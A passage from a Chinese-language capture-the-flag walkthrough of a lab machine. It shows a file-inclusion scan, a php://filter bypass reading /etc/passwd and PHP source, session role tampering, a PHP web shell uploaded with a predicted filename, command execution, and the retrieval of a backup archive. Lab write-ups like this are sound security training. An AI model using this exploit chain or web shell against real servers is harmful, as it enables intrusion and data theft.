3, Lines: 1] /etc/httpd/access.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/conf/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/cups/cupsd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ftpchroot [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/chrootUsers [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/groups [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/lilo.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/shadow [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/inittab [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/hosts.allow [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/inetd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/srm.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/motd [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/logrotate.d/proftpd [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/logrotate.d/vsftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/logs/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/apache2/apache2.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ftpaccess [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/modules.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/mtab [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php5/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/bashrc [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/anacrontab [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php/php4/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/passwd [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/issue [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/chttp.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/exports [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pure-ftpd/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/network/interfaces [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php4/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/cron.deny [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/my.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/fstab [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/grub.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php4/cgi/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pureftpd.passwd [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pure-ftpd/putreftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pureftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/redhat-release [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/ssh_config [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/snmpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/passwd [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pure-ftpd/pure-ftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/my.cnf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/termcap [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/proftpd/proftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/vhcs2/proftpd/proftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php4.4/fcgi/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php4/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php5/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/printcap [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php4/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/cron.allow [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/apache2/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/vsftpd/vsftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/wu-ftpd/ftpaccess [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/wu-ftpd/ftphosts [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/sshd_config [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/wu-ftpd/ftpusers [Status: 200, Size: 25, Words: 3, Lines: 1] /logs/security_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/samba/smb.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/filesystems [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/ssh_host_dsa_key [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/stat [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/swaps [Status: 200, Size: 25, Words: 3, Lines: 1] /root/anaconda-ks.cfg [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ftphosts [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/npasswd [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/lib/php/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /logs/security_debug_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php/cgi/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/modules [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/ssh_host_key.pub [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/version [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/ioports [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/hosts [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/meminfo [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/conf/modsec.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs/license_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs/login_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/mounts [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/mysql/my.cnf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/proftp.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/profile [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php4/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php4/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/vsftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php5/httpd.conf.php [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs/stats_log [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/interrupts [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/sysconfig/network [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/pureftpd/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/pureftpd/etc/pureftpd.pdn [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/vsftpd.chroot_list [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/audit_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/Zend/etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/sbin/pure-config.pl [Status: 200, Size: 25, Words: 3, Lines: 1] /var/adm/log/xferlog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/apache/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /opt/lampp/etc/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /var/lib/mysql/my.cnf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php/httpd.conf.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/pureftpd/sbin/pure-config.pl [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/logs [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/syslog.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache2/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache2/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /logs/pure-ftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache-ssl/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /opt/xampp/etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/conf/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php5/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/etc/pureftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1] /var/cpanel/cpanel.config [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/lsb-release [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/logrotate.d/ftp [Status: 200, Size: 25, Words: 3, Lines: 1] /var/local/www/conf/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /var/htmp [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/networks [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/www/logs/httpd_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/cups/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/lib/mysql/mysql/user.MYD [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/daemon.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/debug [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/dpkg.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim/mainlog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim.paniclog [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/apache/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/at.deny [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/motd [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/auth.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpd/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/kern.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/lighttpd/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/lighttpd/lighttpd.access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpd/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpd/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpd/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/maillog [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/bootptab [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpsd/ssl.access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim_paniclog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/ftp-proxy [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache2/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mysql.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/httpsd/ssl_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mysql/mysql-bin.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mysql/mysql-slow.log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/etc/httpd/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/pureftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/lighttpd/lighttpd.error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/vsftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/dmesg [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/self/net/arp [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/message [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/xferlog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/messages [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mysqlderror.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/faillog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/mysql.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/spool/cron/crontabs/root [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/log/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/resolv.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/pure-ftpd/pure-ftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/lighttpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim_rejectlog [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php5/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /var/run/utmp [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/wtmp [Status: 200, Size: 25, Words: 3, Lines: 1] /var/webmin/miniserv.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/yum.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/ftp-proxy/ftp-proxy.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/ftplog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/logs/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache2/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mail.info [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/proftpd [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/secure [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/cpuinfo [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/lastlog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/chttp.log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim/rejectlog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/lighttpd/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache-ssl/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/ssh_host_key [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/etc/httpd/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mail.warn [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/exim_mainlog [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php4/httpd.conf.php [Status: 200, Size: 25, Words: 3, Lines: 1] /var/www/log/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/boot [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mail.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/mysql/mysql.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/apache2/config.inc [Status: 200, Size: 25, Words: 3, Lines: 1] :: Progress: [257/257] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:25] :: Errors: 1 :: 漏洞利用这边是可以读取出来东西的，证明参数对了，去随便访问一个看看 ┌──(root💀root)-[~/Desktop] └─# curl http://10.10.11.135/image.php?img=/etc/passwd Hacking attempt detected! 这里似乎碰到waf了，想办法绕过一下 这里找到了一篇参考文章 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File Inclusion#wrapper-phpfilter http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php 上面这一条测试后可以绕过，现在我们来构造POC ┌──(root💀root)-[~/Desktop] └─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMTE6MTE0Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQphYXJvbjp4OjEwMDA6MTAwMDphYXJvbjovaG9tZS9hYXJvbjovYmluL2Jhc2gK 得到了一段base64编码，咱们把POC稍微修改一下，让它解密base64 ┌──(root💀root)-[~/Desktop] └─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd|base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2152 100 2152 0 0 3788 0 --:--:-- --:--:-- --:--:-- 3788 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false aaron:x:1000:1000:aaron:/home/aaron:/bin/bash 成功读取文件 然后咱们尝试读取一下之前获取到的本地文件 ┌──(root💀root)-[~/Desktop] └─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php|base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1360 100 1360 0 0 624 0 0:00:02 0:00:02 --:--:-- 624 &lt;?php include(&quot;admin_auth_check.php&quot;); $upload_dir = &quot;images/uploads/&quot;; if (!file_exists($upload_dir)) { mkdir($upload_dir, 0777, true); } $file_hash = uniqid(); $file_name = md5(&#39;$file_hash&#39; . time()) . &#39;_&#39; . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]); $target_file = $upload_dir . $file_name; $error = &quot;&quot;; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if (isset($_POST[&quot;submit&quot;])) { $check = getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]); if ($check === false) { $error = &quot;Invalid file&quot;; } } // Check if file already exists if (file_exists($target_file)) { $error = &quot;Sorry, file already exists.&quot;; } if ($imageFileType != &quot;jpg&quot;) { $error = &quot;This extension is not allowed.&quot;; } if (empty($error)) { if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) { echo &quot;The file has been uploaded.&quot;; } else { echo &quot;Error: There was an error uploading your file.&quot;; } } else { echo &quot;Error: &quot; . $error; } ?&gt; 这边可以看到有一个认证文件admin_auth_check.php，咱们读取一下 ┌──(root💀root)-[~/Desktop] └─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php|base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 268 100 268 0 0 470 0 --:--:-- --:--:-- --:--:-- 471 &lt;?php include_once &quot;auth_check.php&quot;; if (!isset($_SESSION[&#39;role&#39;]) || $_SESSION[&#39;role&#39;] != 1) { echo &quot;No permission to access this panel!&quot;; header(&#39;Location: ./index.php&#39;); die(); } ?&gt; 这里可以看到，咱们要使用文件上传功能那就得有一个role1的权限，但是目前没有任何线索能得到关于role1的内容，这里把&#x2F;etc&#x2F;passwd内获取到的账户aaron拿去尝试一下 成功登录，咱们拿到了一个user2的权限，那不用想肯定是需要越权了 抓了一个包看了一下，似乎没有关于role的权限，那咱们自己加一个呢？试试看 改包加入role&#x3D;1执行后，刷新一下页面 可以看到多了一个admin panel按钮，点进去看看 明确多了一个上传点 ┌──(root💀root)-[~/Desktop] └─# cat shell.jpg &lt;?php system($_GET[cmd]);?&gt; 创建一个带有一句话木马的jpg文件 接着把我们本地系统的时间修改为GMT(我默认的是CST) 然后上传该jpg文件的时候拦截上传包，使用php -a开始执行下列循环语句以后，再放包 while (true){echo date(&quot;D M j G:i:s T Y&quot;); echo &quot; = &quot; ; echo md5(&#39;$file_hash&#39; .time());echo &quot;\\n&quot;;sleep(1);} ┌──(root💀root)-[~/Desktop] └─# php -a Interactive mode enabled php &gt; while (true){echo date(&quot;D M j G:i:s T Y&quot;); echo &quot; = &quot; ; echo md5(&#39;$file_hash&#39; .time());echo &quot;\\n&quot;;sleep(1);} Sat Jan 1 0:50:55 CST 2022 = 019996d3ee825407d56ab94dd16bdb34 Sat Jan 1 0:50:56 CST 2022 = c56f6f652fcf60605708795fe9051eeb Sat Jan 1 0:50:57 CST 2022 = dc3e0079c26a5db5f2c5c96ec26ee917 ┌──(root💀root)-[~] └─# curl &#39;http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&amp;cmd=id&#39; uid=33(www-data) gid=33(www-data) groups=33(www-data) 我把本地时间修改了后，成功getshell，咱们继续下一步 这台机器有防火墙，无法直接拿到反向shell，咱们一步步来 ┌──(root💀root)-[~] └─# curl &#39;http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&amp;cmd=ls+-la+/opt&#39; total 632 drwxr-xr-x 2 root root 4096 Dec 31 16:49 . drwxr-xr-x 24 root root 4096 Nov 29 01:34 .. -rw-r--r-- 1 root root 5609 Dec 31 16:49 default -rw-r--r-- 1 root root 627851 Jul 20 22:36 source-files-backup.zip 咱们把文件复制到&#x2F;var&#x2F;www&#x2F;html&#x2F;images&#x2F;uploads&#x2F;然后下载 ┌──(root💀root)-[~] └─# curl &#39;http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&amp;cmd=cp+/opt/source-files-backup.zip+/var/www/html/images/uploads/&#39; ┌──(root💀root)-[~] └─# curl &#39;http://10.10.11.135/image.php?img=images/uploads/source-files-backup.zip&#39; --output source-files-backup.zip 6 ⨯ % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 613k 0 613k 0 0 165k 0 --:--:-- 0:00:03 --:--:-- 165k ┌──(root💀root)-[~/Desktop/backup] └─# ls -la 总用量 76 drwxr-xr-x 6 root root 4096 7月 20 22:34 . drwxr-xr-x 12 root root 4096 12月 31 17:36 .. -rw-r--r-- 1 root root 200 7月 20 22:34 admin_auth_check.php -rw-r--r-- 1 root root 373 7月 20 22:34 auth_check.php -rw-r--r-- 1 root root 1268 7月 20 